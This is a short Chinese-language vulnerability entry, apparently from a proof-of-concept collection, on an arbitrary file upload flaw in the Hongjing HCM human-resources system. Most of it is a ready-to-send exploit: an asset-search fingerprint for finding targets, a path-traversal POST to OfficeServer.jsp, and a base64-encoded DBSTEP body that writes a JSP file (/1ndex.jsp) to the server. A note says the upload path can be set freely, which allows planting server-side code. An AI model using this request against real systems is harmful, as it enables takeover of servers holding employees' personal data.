# 宏景人力资源信息管理系统customreport存在任意文件上传漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E`　`Content-Length: 417`

**请求体 / payload**
```
DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
FILETYPE=Li5cMW5kZXguanNw
RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=6
<% out.print("123");%>

上传文件位置
/1ndex.jsp

FILETYPE参数为文件上传的路径与文件名，可用base64编码自定义
Li5cMW5kZXguanNw
```

**其他**
- 宏景人力资源信息管理系统customreport存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统